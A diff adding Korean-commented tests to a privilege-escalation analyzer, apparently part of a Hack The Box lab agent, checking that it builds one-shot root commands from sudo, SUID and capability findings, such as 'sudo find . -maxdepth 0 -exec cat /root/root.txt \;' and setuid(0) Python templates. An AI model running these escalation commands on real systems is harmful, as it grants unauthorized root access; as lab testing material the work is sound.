@@ -73,6 +73,34 @@ r = render_vectors(allv)
 check("render 에 제안 명령(↳) 포함", "↳" in r)
 check("벡터 없으면 안내 문구", "후보 없음" in render_vectors([]))
 
+print("\n=== one-shot 비대화형 플랜(TTY 없는 SSH 용) ===")
+# sudo find NOPASSWD → 대화형 /bin/sh 스폰 대신, payload 를 바로 root 로 실행
+sv = analyze_sudo("    (root) NOPASSWD: /usr/bin/find\n")[0]
+check("sudo find one-shot(id) 비대화형",
+      sv.oneshot("id") == "sudo find . -maxdepth 0 -exec id \\;")
+check("sudo find one-shot 루트 플래그 직독",
+      sv.oneshot("cat /root/root.txt") == "sudo find . -maxdepth 0 -exec cat /root/root.txt \\;")
+check("one-shot 에 대화형 /bin/sh 스폰 없음", "/bin/sh" not in sv.oneshot("id"))
+# SUID python → setuid(0) 후 payload
+pv = analyze_suid("/usr/bin/python3.8\n")[0] if analyze_suid("/usr/bin/python3.8\n") else None
+check("SUID python one-shot setuid(0)+payload",
+      pv is not None and "setuid(0)" in pv.oneshot("id") and "/usr/bin/python3.8" in pv.oneshot("id"))
+# capability python → cap 템플릿
+cv = analyze_capabilities("/usr/bin/python3.8 = cap_setuid+ep\n")[0]
+check("cap python one-shot setuid(0)", "setuid(0)" in cv.oneshot("id"))
+# sudo-all → payload 를 바로 sudo
+av = [x for x in analyze_sudo("(ALL : ALL) ALL\n") if x.kind == "sudo-all"][0]
+check("sudo-all one-shot 'sudo id'", av.oneshot("id") == "sudo id")
+# 템플릿 없는 벡터는 빈 문자열(폴백은 호출측 몫)
+check("템플릿 없으면 one-shot 빈 문자열",
+      PrivescVector("sudo", "nosuchbin").oneshot("id") == "")
+check("기본 payload=id", PrivescVector("sudo", "find", path="/usr/bin/find",
+      oneshot_tmpl="sudo find . -maxdepth 0 -exec {payload} \\;").oneshot()
+      == "sudo find . -maxdepth 0 -exec id \\;")
+# render 에 비대화형 라인 노출
+check("render 에 비대화형(one-shot) 노출",
+      "비대화형(one-shot)" in render_vectors(analyze_enum("    (root) NOPASSWD: /usr/bin/find\n")))
+
 print("\n=== 생성 전용 경계(불변) 자기점검 ===")
 import htb_agent.privesc_analyze as pa  # noqa: E402
 for mod in ("subprocess", "socket", "os", "requests", "urllib", "shutil", "pty"):
